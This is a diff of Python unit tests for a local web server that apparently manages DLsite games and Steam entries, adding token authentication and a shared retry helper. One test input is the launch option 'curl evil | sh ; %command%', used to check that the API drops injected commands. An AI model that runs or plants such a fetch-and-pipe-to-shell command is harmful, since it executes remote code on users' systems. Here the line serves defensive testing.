@@ -129,9 +129,10 @@ class RoutingTest(unittest.TestCase):
 
     def setUp(self):
         import json
-        import threading
-        from http.server import ThreadingHTTPServer
+
         from dlsite_deck import webui
+        from dlsite_deck import server as deck_server
+        from tests import support
 
         class FakeBackend:
             """本物に触れずに、経路が正しい先を呼ぶかだけを見る。"""
@@ -152,6 +153,9 @@ class RoutingTest(unittest.TestCase):
             def jobs_json(self):
                 return self._record("jobs")
 
+            def ping(self):
+                return self._record("ping")
+
             def status_json(self):
                 return self._record("status")
 
@@ -167,8 +171,8 @@ class RoutingTest(unittest.TestCase):
             def cancel_download(self, job_id):
                 return self._record("cancel", job_id)
 
-            def register_steam(self, work_id, executable, title, launch_options=None):
-                return self._record("register", work_id, executable, title, launch_options)
+            def register_steam(self, work_id, executable, title):
+                return self._record("register", work_id, executable, title)
 
             def unregister_steam(self, work_id):
                 return self._record("unregister", work_id)
@@ -223,26 +227,18 @@ class RoutingTest(unittest.TestCase):
 
         self.json = json
         self.webui = webui
+        self.deck_server = deck_server
         self.backend = FakeBackend()
-        handler = type("H", (webui.Handler,), {"backend": self.backend})
-        self.server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
+        self.token = "test-token"
+        handler = deck_server.make_handler(self.backend, token=self.token)
+        self.server = support.start_server(self, handler)
         self.port = self.server.server_address[1]
-        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
-        thread.start()
-        self.addCleanup(self.server.server_close)
-        self.addCleanup(self.server.shutdown)
 
     def _request(self, path, payload=None, raw=None):
-        """1 回だけ要求を出す。接続が切られたら数回まで出し直す。
-
-        Windows の一部の環境では loopback への接続が一定の割合で
-        RST される。標準の BaseHTTPRequestHandler でも同じ割合で起きるため
-        ツール側の問題ではない (SteamDeck 実機では 200 回中 0 回)。
-        ここで再試行しないと、この環境でだけテストが落ちる。
-        """
-        import time
-        import urllib.error
+        """1 回だけ要求を出す (接続が切られたら support が出し直す)。"""
         import urllib.request
+
+        from tests import support
 
         url = f"http://127.0.0.1:{self.port}{path}"
         if raw is not None:
@@ -250,21 +246,13 @@ class RoutingTest(unittest.TestCase):
         else:
             data = self.json.dumps(payload).encode() if payload is not None else None
 
-        last = None
-        for attempt in range(5):
-            request = urllib.request.Request(url, data=data)
-            try:
-                with urllib.request.urlopen(request, timeout=10) as response:
-                    return response.status, response.read()
-            except urllib.error.HTTPError as error:
-                # これは応答が返っている。中身を見たいので再試行しない。
-                return error.code, error.read()
-            except (ConnectionError, TimeoutError, OSError) as error:
-                last = error
-                # 混んでいると読み取りごと待たされる。少しずつ間隔を空ける。
-                time.sleep(0.2 * (attempt + 1))
+        # 画面と同じく合言葉を付け、POST は JSON として送る
+        headers = {self.deck_server.TOKEN_HEADER: self.token}
+        if data is not None:
+            headers["Content-Type"] = "application/json"
 
-        raise AssertionError(f"{path} に接続できませんでした: {last}")
+        return support.open_with_retry(
+            urllib.request.Request(url, data=data, headers=headers))
 
     def test_page_is_served(self):
         status, body = self._request("/")
@@ -277,6 +265,7 @@ class RoutingTest(unittest.TestCase):
             "/api/library?refresh=1": ("library", (True,)),
             "/api/executables?work_id=RJ1": ("executables", ("RJ1",)),
             "/api/jobs": ("jobs", ()),
+            "/api/ping": ("ping", ()),
             "/api/status": ("status", ()),
             "/api/config": ("config", ()),
             "/api/links": ("links", ()),
@@ -304,12 +293,13 @@ class RoutingTest(unittest.TestCase):
             ("/api/download/cancel", {"job_id": 3}, ("cancel", (3,))),
             ("/api/steam/register", {"work_id": "RJ1", "executable": "a.exe",
                                      "title": "T"},
-             ("register", ("RJ1", "a.exe", "T", None))),
-            # 起動オプションを明示した場合はそのまま届くこと
+             ("register", ("RJ1", "a.exe", "T"))),
+            # 起動オプションを送っても backend には渡らないこと。任意のコマンドを
+            # 書けるので、API からは受け取らない。
             ("/api/steam/register", {"work_id": "RJ1", "executable": "a.exe",
                                      "title": "T",
-                                     "launch_options": "LANG=ja_JP.UTF-8 %command%"},
-             ("register", ("RJ1", "a.exe", "T", "LANG=ja_JP.UTF-8 %command%"))),
+                                     "launch_options": "curl evil | sh ; %command%"},
+             ("register", ("RJ1", "a.exe", "T"))),
             ("/api/steam/unregister", {"work_id": "RJ1"}, ("unregister", ("RJ1",))),
             ("/api/config", {"values": {"b": 1, "a": 2}},
              ("save_config", (("a", "b"),))),
@@ -379,8 +369,9 @@ class PageScriptTest(unittest.TestCase):
         import re
 
         from dlsite_deck import webui
+        from dlsite_deck import server as deck_server
 
-        found = re.search(r"<script>(.*?)</script>", webui.PAGE, re.S)
+        found = re.search(r"<script>(.*?)</script>", deck_server.PAGE, re.S)
         self.assertIsNotNone(found, "script が見つからない")
         return found.group(1)
 
@@ -428,6 +419,7 @@ class ShutdownTest(unittest.TestCase):
         import threading
         from http.server import ThreadingHTTPServer
         from dlsite_deck import config as config_module, webui
+        from dlsite_deck import server as deck_server
 
         import tempfile
 
@@ -437,8 +429,10 @@ class ShutdownTest(unittest.TestCase):
         cfg.state_file = str(Path(self.tmp.name) / "state.json")
 
         self.webui = webui
+        self.deck_server = deck_server
         self.backend = webui.Backend(cfg)
-        handler = type("H", (webui.Handler,), {"backend": self.backend})
+        self.token = "test-token"
+        handler = deck_server.make_handler(self.backend, token=self.token)
         self.server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
         self.backend._server = self.server
         self.port = self.server.server_address[1]
@@ -461,7 +455,8 @@ class ShutdownTest(unittest.TestCase):
         for _ in range(5):
             request = urllib.request.Request(
                 url + "/api/shutdown", data=b"{}",
-                headers={"Content-Type": "application/json"},
+                headers={"Content-Type": "application/json",
+                         self.deck_server.TOKEN_HEADER: self.token},
             )
             try:
                 with urllib.request.urlopen(request, timeout=10) as response:
@@ -481,10 +476,17 @@ class ShutdownTest(unittest.TestCase):
         self.thread.join(timeout=10)
         self.assertFalse(self.thread.is_alive(), "serve_forever が抜けていない")
 
+        # 合言葉を付けて問い合わせる。付けないと、動いていても 403 が返り、
+        # それを「繋がらない」と取り違えて通ってしまう。
+        probe = urllib.request.Request(
+            url + "/api/steam/state", headers={self.deck_server.TOKEN_HEADER: self.token}
+        )
         deadline = time.monotonic() + 5
         while time.monotonic() < deadline:
             try:
-                urllib.request.urlopen(url + "/api/steam/state", timeout=2)
+                urllib.request.urlopen(probe, timeout=2)
+            except urllib.error.HTTPError:
+                self.fail("まだ応答を返している")
             except (urllib.error.URLError, OSError):
                 return
             time.sleep(0.1)
